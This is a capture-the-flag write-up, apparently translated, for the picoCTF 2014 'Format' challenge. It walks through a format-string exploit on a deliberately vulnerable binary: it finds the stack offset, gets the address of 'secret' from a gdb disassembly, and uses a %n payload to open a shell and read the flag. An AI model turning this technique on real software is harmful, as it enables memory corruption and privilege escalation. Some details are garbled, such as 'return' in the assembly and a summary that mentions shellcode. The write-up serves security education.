# Pico CTF 2014 : Format
## **[Principle]**
nc
## **[Purpose]**
Master the general process of PWN topics
## **[Environment]**
Ubuntu
## **[Tools]**
gdb、objdump、python
## **[Process]**

Here's the source code：
	
	#include <stdio.h>
	#include <stdlib.h>
	#include <fcntl.h>
	
	int secret = 0;
	
	void give_shell(){
	    gid_t gid = getegid();
	    setresgid(gid, gid, gid);
	    system("/bin/sh -i");
	}
	
	int main(int argc, char **argv){
	    int *ptr = &secret;
	    printf(argv[1]);
	
	    if (secret == 1337){
	        give_shell();
	    }
	    return 0;
	}

So we need to somehow find a way to change the value of the secret to 1337 using the format string attack because the printf () function is not implemented correctly. First, let's see what the stack looks like.
Note: in this case, the environment variables are confused with the stack, so it's helpful to use the'env -i'command to clear the environment before running the command.
	
	pico1139@shell:/home/format$ for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x;echo ;done | grep 4141
	Offset: 105:AAAA41414141

This means that we can see an offset of 105 at the top of the stack. However, when you add more data, the offset of the original input changes, so first add 1333 more bytes of data, and then look at the offset. (1337 is the secret we want, and we'll write four bytes (AAAA), so 1333 + 4 = 1337)
	
	for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
	Offset: 103:AAAA41410074
	Offset: 104:AAAA31254141

So we discovered our A again, but they weren't on the stack. Finally, add two more A to see if you can make it stand in line.
	
	for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
	Offset: 103:AAAA41414141

Good! Our offset is 103.. Now we need to find the address used to change the data in the secret
	
	pico1139@shell:/home/format$ gdb -q format
	Reading symbols from format...(no debugging symbols found)...done.
	(gdb) disass main
	Dump of assembler code for function main:
	   0x080484e2 <+0>:	push   %ebp
	   0x080484e3 <+1>:	mov    %esp,%ebp
	   0x080484e5 <+3>:	and    $0xfffffff0,%esp
	   0x080484e8 <+6>:	sub    $0x20,%esp
	   0x080484eb <+9>:	movl   $0x804a030,0x1c(%esp)
	   0x080484f3 <+17>:	mov    0xc(%ebp),%eax
	   0x080484f6 <+20>:	add    $0x4,%eax
	   0x080484f9 <+23>:	mov    (%eax),%eax
	   0x080484fb <+25>:	mov    %eax,(%esp)
	   0x080484fe <+28>:	call   0x8048350 <printf@plt>
	   0x08048503 <+33>:	mov    0x804a030,%eax
	   0x08048508 <+38>:	cmp    $0x539,%eax
	   0x0804850d <+43>:	jne    0x8048514 <main+50>
	   0x0804850f <+45>:	call   0x80484ad <give_shell>
	   0x08048514 <+50>:	mov    $0x0,%eax
	   0x08048519 <+55>:	leave  
	   0x0804851a <+56>:	return

It appears that the address 0x0804a030 is placed in * ptr. This is what we need to replace our A address. To place the number 1337 in the secret memory address, we need to use the%n modifier. (%103 $n will look at the data located at offset 103 as the memory address and write the total number of bytes written into the address so far.)
	
	pico1139@shell:/home/format$ env -i ./format $(python -c 'print "\x30\xa0\x04\x08"+"%1333u%103$nAA"')
	$ id
	uid=11066(pico1139) gid=1008(format) groups=1017(picogroup)
	$ ls
	Makefile  flag.txt  format  format.c
	$ cat flag.txt
	xctf{XXXXXX}


## **[Summary]**
Master the general idea of doing the PWN topic, learn to find and modify shellcode.